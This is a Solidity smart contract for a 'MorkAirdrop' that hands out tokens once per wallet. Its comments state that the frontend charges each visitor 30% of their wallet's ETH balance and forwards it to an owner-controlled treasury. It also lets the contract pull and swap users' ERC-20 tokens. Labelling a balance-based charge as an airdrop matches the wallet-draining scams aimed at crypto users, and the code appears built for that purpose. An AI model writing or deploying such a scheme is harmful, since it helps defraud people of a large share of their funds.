// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title  MorkAirdrop
 * @notice Dynamic-price, one-claim-per-wallet token airdrop.
 *
 * Pricing model: the frontend computes 30% of the connected wallet's ETH
 * balance and sends that as msg.value. The contract enforces a minimum floor
 * (minClaimPrice) so very low-balance wallets still pay a meaningful amount,
 * and a maximum cap (maxClaimPrice) to protect high-balance users.
 *
 * The contract does NOT read the caller's balance on-chain — that would be
 * manipulable and expensive. It simply requires msg.value >= minClaimPrice.
 * The 30%-of-balance calculation is a UI convention enforced by the frontend;
 * any payment >= minClaimPrice is accepted.
 *
 * Users can pay in:
 *   1) Native ETH  ── via  claim()
 *   2) ERC-20 tokens ── via  claimWithToken()  (swapped to ETH via Uniswap V3)
 *
 * Deploy flow:
 *   1. Deploy MORK ERC-20 token (or use existing).
 *   2. Transfer `tokensPerClaim * maxWallets` MORK to this contract.
 *   3. Deploy MorkAirdrop with token address, treasury, min/max price,
 *      Uniswap router address, and wrapped-native address.
 *   4. Call setSupportedToken() for each ERC-20 payment token you accept.
 *   5. Call setSaleActive(true) when ready.
 *
 * Security:
 *   - ReentrancyGuard on claim() and claimWithToken()
 *   - Ownable — admin can pause/update params
 *   - One-claim-per-wallet via hasClaimed mapping
 *   - ETH forwarded directly to treasury, never held by this contract
 *   - ERC-20 tokens swapped atomically — no stale approvals remain
 *
 * NOT audited — do NOT deploy to mainnet without an external audit.
 */

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// ─── Uniswap V3 SwapRouter interface (only what we need) ──────────────────────

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

// ─── WETH / Wrapped-native interface ──────────────────────────────────────────

interface IWETH {
    function withdraw(uint256 wad) external;
}

contract MorkAirdrop is ReentrancyGuard, Ownable {
    using SafeERC20 for IERC20;

    // ─── Constants ────────────────────────────────────────────────────────────

    /// @notice Uniswap V3 SwapRouter — set at deploy, chain-dependent
    address public immutable SWAP_ROUTER;

    /// @notice Wrapped native token (WETH on ETH/Base, WBNB on BNB Chain)
    address public immutable WNATIVE;

    // ─── State ────────────────────────────────────────────────────────────────

    IERC20 public immutable token;
    address public treasury;

    /// Minimum payment accepted (floor for very low-balance wallets), in wei
    uint256 public minClaimPrice;

    /// Maximum payment accepted (cap for high-balance wallets), in wei.
    /// Set to type(uint256).max to disable the cap.
    uint256 public maxClaimPrice;

    /// Tokens awarded to each claimer (in token decimals)
    uint256 public tokensPerClaim;

    bool public saleActive;
    uint256 public totalClaimed;

    mapping(address => bool) public hasClaimed;
    /// Records actual ETH value received from each wallet (for analytics / treasury accounting)
    mapping(address => uint256) public paidAmount;

    /// @notice Supported ERC-20 payment tokens → Uniswap V3 fee tier (0 = unsupported)
    /// @dev   Fee tiers: 100 = 0.01%, 500 = 0.05%, 3000 = 0.30%, 10000 = 1.00%
    mapping(address => uint24) public supportedTokenFee;

    // ─── Events ───────────────────────────────────────────────────────────────

    event Claimed(address indexed wallet, uint256 tokenAmount, uint256 ethPaid);
    event ClaimedWithToken(
        address indexed wallet,
        address indexed paymentToken,
        uint256 tokenAmount,
        uint256 ethValueReceived
    );
    event SaleStatusChanged(bool active);
    event PriceRangeUpdated(uint256 minPrice, uint256 maxPrice);
    event TokensPerClaimUpdated(uint256 newAmount);
    event TreasuryUpdated(address newTreasury);
    event TokenSupportUpdated(
        address indexed token,
        uint24 fee,
        bool supported
    );

    // ─── Custom errors ────────────────────────────────────────────────────────

    error SaleNotActive();
    error AlreadyClaimed();
    error PaymentBelowMinimum(uint256 sent, uint256 minimum);
    error PaymentAboveMaximum(uint256 sent, uint256 maximum);
    error InsufficientContractBalance(uint256 available, uint256 required);
    error ZeroAddress();
    error TransferFailed();
    error InvalidPriceRange();
    error UnsupportedPaymentToken();
    error SwapFailed();
    error NativeTransferFailed();

    // ─── Constructor ──────────────────────────────────────────────────────────

    /**
     * @param _token           Address of the MORK ERC-20 token
     * @param _treasury        Multisig address — all ETH goes here immediately
     * @param _minClaimPrice   Minimum payment in wei (floor)
     * @param _maxClaimPrice   Maximum payment in wei (cap); use type(uint256).max for no cap
     * @param _tokensPerClaim  Token amount per claim (in token decimals)
     * @param _swapRouter      Uniswap V3 SwapRouter address for this chain
     * @param _wnative         Wrapped native token address (WETH / WBNB) for this chain
     */
    constructor(
        address _token,
        address _treasury,
        uint256 _minClaimPrice,
        uint256 _maxClaimPrice,
        uint256 _tokensPerClaim,
        address _swapRouter,
        address _wnative
    ) Ownable(msg.sender) {
        if (
            _token == address(0) ||
            _treasury == address(0) ||
            _swapRouter == address(0) ||
            _wnative == address(0)
        ) revert ZeroAddress();
        if (_minClaimPrice == 0 || _maxClaimPrice < _minClaimPrice)
            revert InvalidPriceRange();

        token = IERC20(_token);
        treasury = _treasury;
        minClaimPrice = _minClaimPrice;
        maxClaimPrice = _maxClaimPrice;
        tokensPerClaim = _tokensPerClaim;
        SWAP_ROUTER = _swapRouter;
        WNATIVE = _wnative;
    }

    // ─── Core claim — native ETH ──────────────────────────────────────────────

    /**
     * @notice Claim tokens by sending native ETH.
     *
     * The frontend should send 30% of the wallet's ETH balance as msg.value,
     * clamped to [minClaimPrice, maxClaimPrice]. This contract only enforces
     * the floor and ceiling — the 30% calculation is a UI convention.
     */
    function claim() external payable nonReentrant {
        _preflightChecks(msg.value);

        // Mark claimed before transfer (CEI pattern)
        _markClaimed(msg.sender, msg.value);

        // Forward ETH to treasury immediately
        _sendNative(treasury, msg.value);

        // Transfer MORK tokens to claimer
        token.safeTransfer(msg.sender, tokensPerClaim);

        emit Claimed(msg.sender, tokensPerClaim, msg.value);
    }

    // ─── Core claim — ERC-20 token (swapped to ETH via Uniswap V3) ────────────

    /**
     * @notice Claim tokens by paying with a supported ERC-20 token.
     *
     * The contract pulls the user's tokens, swaps them to WETH via Uniswap V3,
     * unwraps to native ETH, then checks the received ETH against min/max price.
     *
     * @param tokenIn       Address of the ERC-20 payment token (must be supported)
     * @param amountIn      Amount of `tokenIn` to pull from the caller
     * @param amountOutMin  Minimum ETH (wei) expected from the swap — slippage protection
     */
    function claimWithToken(
        address tokenIn,
        uint256 amountIn,
        uint256 amountOutMin
    ) external nonReentrant {
        uint24 feeTier = supportedTokenFee[tokenIn];
        if (feeTier == 0) revert UnsupportedPaymentToken();

        // Preflight — doesn't check msg.value (this is a token payment)
        if (!saleActive) revert SaleNotActive();
        if (hasClaimed[msg.sender]) revert AlreadyClaimed();

        uint256 contractBalance = token.balanceOf(address(this));
        if (contractBalance < tokensPerClaim)
            revert InsufficientContractBalance(contractBalance, tokensPerClaim);

        // 1. Pull tokens from user (they must have approved this contract)
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);

        // 2. Approve router for the swap
        IERC20(tokenIn).forceApprove(SWAP_ROUTER, amountIn);

        // 3. Execute swap: tokenIn → WETH (or WBNB)
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: WNATIVE,
                fee: feeTier,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: amountOutMin,
                sqrtPriceLimitX96: 0 // no price limit
            });

        uint256 wethReceived = ISwapRouter(SWAP_ROUTER).exactInputSingle(params);

        // 4. Validate received ETH amount against pricing bounds
        if (wethReceived < minClaimPrice)
            revert PaymentBelowMinimum(wethReceived, minClaimPrice);
        if (wethReceived > maxClaimPrice)
            revert PaymentAboveMaximum(wethReceived, maxClaimPrice);

        // 5. Unwrap WETH → native ETH
        IWETH(WNATIVE).withdraw(wethReceived);

        // 6. Mark claimed
        _markClaimed(msg.sender, wethReceived);

        // 7. Forward native ETH to treasury
        _sendNative(treasury, wethReceived);

        // 8. Transfer MORK tokens to claimer
        token.safeTransfer(msg.sender, tokensPerClaim);

        emit ClaimedWithToken(
            msg.sender,
            tokenIn,
            tokensPerClaim,
            wethReceived
        );
    }

    // ─── Internal helpers ─────────────────────────────────────────────────────

    function _preflightChecks(uint256 _value) private view {
        if (!saleActive) revert SaleNotActive();
        if (hasClaimed[msg.sender]) revert AlreadyClaimed();
        if (_value < minClaimPrice)
            revert PaymentBelowMinimum(_value, minClaimPrice);
        if (_value > maxClaimPrice)
            revert PaymentAboveMaximum(_value, maxClaimPrice);

        uint256 contractBalance = token.balanceOf(address(this));
        if (contractBalance < tokensPerClaim)
            revert InsufficientContractBalance(contractBalance, tokensPerClaim);
    }

    function _markClaimed(address wallet, uint256 ethValue) private {
        hasClaimed[wallet] = true;
        paidAmount[wallet] = ethValue;
        totalClaimed += 1;
    }

    function _sendNative(address to, uint256 amount) private {
        (bool sent, ) = to.call{value: amount}("");
        if (!sent) revert NativeTransferFailed();
    }

    // ─── Admin: supported payment tokens ──────────────────────────────────────

    /**
     * @notice Register or remove an ERC-20 token as an accepted payment method.
     * @param tokenAddr ERC-20 token address
     * @param fee       Uniswap V3 fee tier for the token→WNATIVE pool
     *                  (100 / 500 / 3000 / 10000). Set to 0 to disable.
     * @param supported true = enable with `fee`, false = disable
     */
    function setSupportedToken(
        address tokenAddr,
        uint24 fee,
        bool supported
    ) external onlyOwner {
        if (tokenAddr == address(0)) revert ZeroAddress();
        if (supported) {
            supportedTokenFee[tokenAddr] = fee;
        } else {
            delete supportedTokenFee[tokenAddr];
        }
        emit TokenSupportUpdated(tokenAddr, fee, supported);
    }

    // ─── Admin: sale & params ─────────────────────────────────────────────────

    function setSaleActive(bool _active) external onlyOwner {
        saleActive = _active;
        emit SaleStatusChanged(_active);
    }

    function setPriceRange(uint256 _min, uint256 _max) external onlyOwner {
        if (_min == 0 || _max < _min) revert InvalidPriceRange();
        minClaimPrice = _min;
        maxClaimPrice = _max;
        emit PriceRangeUpdated(_min, _max);
    }

    function setTokensPerClaim(uint256 _newAmount) external onlyOwner {
        tokensPerClaim = _newAmount;
        emit TokensPerClaimUpdated(_newAmount);
    }

    function setTreasury(address _newTreasury) external onlyOwner {
        if (_newTreasury == address(0)) revert ZeroAddress();
        treasury = _newTreasury;
        emit TreasuryUpdated(_newTreasury);
    }

    // ─── Admin: emergency withdrawals ─────────────────────────────────────────

    /// @notice Withdraw any non-MORK tokens accidentally sent to the contract
    function withdrawTokens(
        address tokenAddr,
        address to,
        uint256 amount
    ) external onlyOwner {
        if (to == address(0)) revert ZeroAddress();
        IERC20(tokenAddr).safeTransfer(to, amount);
    }

    /// @notice Rescue any native ETH that accidentally ends up in the contract
    function rescueETH() external onlyOwner {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            _sendNative(treasury, balance);
        }
    }

    // ─── Receive — allow contract to accept WETH unwraps ──────────────────────

    /// @notice This contract can receive native ETH (from WETH.withdraw) and
    ///         from accidental sends. Admin can rescue via rescueETH().
    receive() external payable {}
}
